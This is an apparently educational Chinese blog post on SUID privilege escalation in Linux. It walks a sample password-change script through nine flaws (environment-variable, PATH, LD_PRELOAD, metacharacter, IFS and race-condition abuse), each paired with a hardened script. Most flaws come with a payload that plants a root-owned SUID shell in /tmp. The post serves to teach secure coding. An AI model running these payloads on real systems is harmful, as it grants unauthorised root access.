---
title: SUID越权利用
date: 2021-04-10 21:41:59
tags: SUID 渗透测试
---

# Set-UID Privileged Programs

## 原理:

### 操作系统:

#### Linux:

linux系统具有严格的权限管理,故只有linux系统有suid属性

#### Windows:

但是windows是怎么解决这个问题的呢?

### 工作原理:

当一个文件设置为suid属性时,则当***任意用户***在运行此程序时,都变为此***程序拥有者***所拥有的权限

### 情景:

1.你希望别人能通过一个程序***间接地***访问你的文件,但你又***不希望***别人能够***直接查看更改***你的文件,那这要怎么办呢?答案是:将此程序设置为suid属性

2.shadow文件是000的权限,即所有用户都不能修改(**root无视权限限制**)当用户使用passwd命令更改密码时,就是因为passwd属性设置为suid,而其拥有者为root,所以可以更改shadow文件

## 漏洞

### 简介:

大多数管理员都通过suid属性便捷他们的日常工作.但在这其中,大多数管理员都没有注意到一些细微的问题,以导致安全问题的发生.

### 利用过程:

```bash
% ls change-pass
-rwsr-x--- 1 root helpdesk
 37 Feb 26 16:35 change-pass
% cat change-pass
#!/bin/csh -b
set user = $1
passwd $user
```

假设我创建了一个含suid属性的shell脚本,用于方便用户更改密码.此时一切看起来安好,然而却有漏洞存在

#### 1.永远不要使用C-shell编写SUID脚本

当程序在运行时,会接收到许多参数.大多数时候,程序员都关注于明显的输入,例如文中的$1,但漏洞往往隐藏在一些不明显的地方——环境变量

payload:

```bash
env TERM='`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`' change-pass
```

此处重设置了TERM变量,而当C-shell脚本在运行时,便执行了TERM中的命令,从而导致漏洞发生

#### 2.记住手动设置PATH,并且使用绝对路径

在上文中的`passwd $user`命令中,passwd使用了相对路径,从而导致漏洞发生.

在正常情况下,系统会去搜索PATH路径下的passwd,然后执行/usr/bin/passwd文件

但是如果攻击者将PATH设置为当前路径,并且创建一个恶意shell脚本,那么就会导致漏洞发生

payload:

```bash
% export PATH='/tmp'
% echo "cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh" >/tmp/passwd
% ./change-pass
```

更改后的脚本如下:

```bash
#!/bin/ksh
PATH='/bin:/usr/bin'
user=$1
/usr/bin/passwd $user
```

另一个例子有一个C文件调用了system()函数,`system("mail")`

攻击者可以通过修改PATH,然后创建相应文件进行攻击

#### 3.设置LD_LIBRARY_PATH

当linux中,除非在编译时加上static选项,否则都会默认调用动态链接库`ld.so/ld-linux.so`

可以使用`ldd FILE`查看所依赖的库

当程序运行时会在LD_LIBRARY_PATH变量中查找所需动态库的地址,如果攻击者将此环境变量重置,从而将动态链接库替换为恶意代码,那么就会导致恶意代码执行

解决方法:

1.在程序中设置此环境变量

2.在编译时静态连接

#### 4.设置LD_PRELOAD变量

与3类似,当程序在运行前,会先链接此变量中的动态链接库,如果攻击者修改为自己的恶意链接库,则造成危害

举个例子:

`export LD_PRELOAD=./libmylib.so`

```c
//a.c    C代码
#include <stdio.h>
void sleep (int s)
{
printf("I am not sleeping!\n");
}
```

编译:

```bash
gcc -fPIC -g -c a.c
gcc -shared -o libmylib.so a.o -lc
```

```c
//被攻击程序
int main()
{
sleep(1);
return 0;
}
```

运行如上程序,则可以通过SUID执行恶意代码

#### 5.了解程序是怎么运作的

```bash
#!/bin/ksh
PATH='/bin:/usr/bin'
user=$1
rm /tmp/.user
echo "$user" > /tmp/.user
isroot='/usr/bin/grep -c root /tmp/.user'
[ "$isroot" -gt 0 ] && echo "You Can't change root's password!" && exit
/usr/bin/passwd $user
```

承接上文,如果此程序可以用来更改root的密码,那岂不是犯了大错,所以在程序中加入了用户检测,看看是不是root.如果是,那么就退出程序

你以为这样就万事大吉了吗?不,还有许多问题.

思考一个问题,如果用户输入为空,即单纯运行此脚本,那么是否会正常执行passwd命令?

要记住,当passwd输入为空时,默认更改的账号是执行者的账号.又由于suid的设置,即会更改root的密码.也就是说,前面的检测不完全.

新文件:

```BASH
#!/bin/ksh
PATH='/bin:/usr/bin'
user=$1
[ -z $user ] && echo "Usage: change-pass username" && exit
rm /tmp/.user
echo "$user" > /tmp/.user
isroot='/usr/bin/grep -c root /tmp/.user'
[ "$isroot" -gt 0 ] && echo "You Can't change root's password!" && exit
/usr/bin/passwd $user
```

可以看到,在这里添加了检测输入是否为空,如果为空即退出.

##### 所以,一定要理解程序是怎么运行的,特别关注各种参数带来的不同影响.

#### 6.除非必要,不要使用临时文件.就算要使用也不要放在公共可读写区域.

当攻击者在脚本删除文件的一瞬间后,又创建了一个.user文件,内部为空.那么这个时候会被覆盖吗?也许会,但也许也不会,这要看文件权限是怎么设置的.但是一旦没有覆盖,攻击者就绕过了用户名检测,就可以更改root的密码了.

#### 7.检查所有输入,去除元字符

```bash
#!/bin/ksh
PATH='/bin:/usr/bin'
user=$1
[ -z $user ] && echo "Usage: change-pass username" && exit
[ "$user" = root ] && echo "You can't change root's password!" && exit
/usr/bin/passwd $user
```

​	在新脚本中,我们不再使用临时文件,转而直接检测.但却没有对用户输入进行更深的检测,这就有可能导致漏洞的发生

payload: `./change-pass "user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh"`

可以看到,在此处运用了`;`进行分割,当程序执行完passwd命令后,又会以root身份执行其他命令,这无异是一个很大的问题.

新脚本:

```bash
#!/bin/ksh
PATH='/bin:/usr/bin'
user=${1##*[ \\$/;()|\>\<& ]}
[ -z $user ] && echo "Usage: change-pass username" && exit
[ "$user" = root ] && "You can't change root's password!" && exit
/usr/bin/passwd $user
```

在此处,我们对用户的输入进行过滤,去除元字符,从而保障语句执行的正确性.

#### 8.记得设置IFS

IFS,一个环境变量,Internal Field Separator,即内部字段分隔符.在这里,如果提前设置

`export IFS='/'`那么当程序执行`/usr/bin/passwd`时,就会执行`usr`、`bin`、`passwd`三个命令,从而造成危险

```bash
#!/bin/ksh
PATH='/bin:/usr/bin'
IFS=' '
user=${1##*[ \\$/;()|\>\<& ]}
[ -z $user ] && echo "Usage: change-pass username" && exit
[ "$user" = root ] && "You can't change root's password!" && exit
/usr/bin/passwd $user
```

#### 9.不可避免的危险——固有条件竞争

程序在执行suid脚本时分为两步

1.系统打开一个新shell

2.新shell读取脚本的内容并执行.

如果时间点卡得刚刚好,那么攻击者可以先创建一个链接,在执行改链接文件的瞬间替换它的内容,从而实现通过SUID所有者权限执行任意内容

payload:

```bash
./rootme & rm rootme && \
echo "cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh" \
 >> rootme
```

### 	修复:

#### 		尽量少调用外部函数

#### 		最小特权原则

## 参考

[EN - SUID Privileged Programs.pdf](http://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf)

[EN - Dangers of SUID Shell Scripts.pdf](http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf)

